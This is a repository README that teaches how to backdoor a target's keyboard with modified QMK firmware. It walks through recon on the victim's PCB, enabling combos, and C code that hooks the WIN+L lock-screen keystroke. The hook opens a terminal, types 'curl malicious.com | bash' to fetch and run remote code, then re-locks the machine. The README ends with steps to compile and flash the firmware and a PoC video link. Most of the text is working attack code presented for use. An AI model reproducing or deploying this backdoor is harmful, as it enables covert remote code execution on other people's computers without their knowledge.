# QMKhuehuebr
This repo will teach you how to create a "backdoor" on a keyboard using qmk firmware.

## What's QMK?
It's a open source keyboard firmware, read the [documentation](https://docs.qmk.fm) for more info.

## How does this "Backdoor" works?
It hooks a set of keystrokes used for screen locking using the [qmk combo](https://docs.qmk.fm/#/feature_combo?id=combos) feature, so when the user locks the computer his keyboard will start acting like a [rubberducky](https://www.youtube.com/watch?v=JwLRjNPrO2c) or "possessed" keyboard injecting keystrokes in the target machine.

## Steps to get a Shell
### Keyboard Recon
The most important step is to recognize which PCB your victim's keyboard uses. This can be
done in several ways:
* Social Engineering
* Opening the keyboard case
* Being a keyboard guru

### Get QMK Firmware Project
```bash
git clone https://github.com/qmk/qmk_firmware.git
cd qmk_firmware
util/(linux|macos)_install.sh
```

### Enabling and Configuring Combos feature
Now that you know your victim's keyboard PCB, go to `qmk_firmware/keyboards/<PCB_MODEL>/` and then add the line `COMBO_ENABLE = yes` at the last line of file `rules.mk`, to enable the usage of combos. Also modify the following lines at the last line of file `config.h`:
```
#define COMBO_COUNT 1
#define COMBO_TERM 300
```
The `COMBO_COUNT` variable is the number of combos/hooks you'll configure, and the `COMBO_TERM` is the time in milliseconds for the firmware to detect the key combination/combo.

### Creating the Combos/Hooks
Copy the default keymap to a new keymap named keylogger,
```bash
cd qmk_firmware/keyboards/<PCB_MODEL>/keymaps
mkdir keylogger
cp -R default/* keylogger
cd keylogger/
```
Edit the `keymap.c` file to insert your malicious code after the `#include "action_layer.h"` line, the first thing you need to do is create an enum with your hook name:
```C
enum combo_events {
  LOCK_SCREEN
}
```
Then you need to set the key combinations you want to hook, in this example let's hook the WIN+L lock screen bind:
```C
const uint16_t PROGMEM lock_screen_combo[] = {KC_LGUI, KC_L, COMBO_END};
```
If you want to hook other keys just look at this [qmk documentation page](https://beta.docs.qmk.fm/features/keycodes_basic) where you can find a list with all keycodes.

### Giving actions to Combos/Hooks
Now the last part of coding is to add an action when the firmware detects the combo/hook, in order to do this, let's keep editing the `keymap.c` and declare the function bellow which is responsible for the detection and injection:
```C
void process_combo_event(uint8_t combo_index, bool pressed) {
	switch(combo_index) {
		case LOCK_SCREEN_X:
			if (pressed) {
				// SEND THE COMBINATION KEYS TO OPEN TERMINAL WIN+ENTER
				register_code(KC_LGUI);
				register_code(KC_ENTER);
				// RELEASE THE KEYS TO OPEN THE TERMINAL
				unregister_code(KC_ENTER);
				unregister_code(KC_LGUI);
				//WAIT 500 MILLISECONDS FOR THE TERMINAL OPEN
				_delay_ms(500);

				//SEND COMMAND USING THE MACRO SEND_STRING WHICH SENDS KEYCODE BY KEYCODE WITHOUT DELAY
				SEND_STRING("curl malicious.com \\| bash ; exit" SS_TAP(X_ENTER));

				//SEND THE ORIGINAL KEYCODES RESPONSIBLE TO LOCK THE COMPUTER
				register_code(KC_LGUI);
				register_code(KC_L);
				// RELEASE THE KEYS RESPONSIBLE TO LOCK THE COMPUTER
				unregister_code(KC_L);
				unregister_code(KC_LGUI);
			}
	}
break;
}
```
### Compile the code
Go back to the qmk project root directory and run:
```bash
make <KEYBOARD_PCB>:keylogger
```
If there was no errors, you did everything right and is ready to move on.

### Boot Mode
In order to put the keyboard on boot mode, follow the QMK [instruction](https://docs.qmk.fm/#/newbs_flashing?id=put-your-keyboard-into-dfu-bootloader-mode)

### Write the malicious firmware
Just run the command:
```bash
sudo make <KEYBOARD_PCB>:keylogger:dfu
```
Now after all these steps you have successfully infected your victim's keyboard.

### Learn more about QMK
[RTFM](https://docs.qmk.fm/)

# Example
You can find a more complex example of [keymap.c](xd60/keymaps/keylogger/keymap.c) on this repository.

**IMPORTANT - This file is based on xd60 PCB.**

# Poc 
PoC usign a xd60 PCB

[![CODE_IS_CHEAP_SHOW_ME_THE_DEMO](http://img.youtube.com/vi/CbhiKdS48lc/0.jpg)](http://www.youtube.com/watch?v=CbhiKdS48lc)
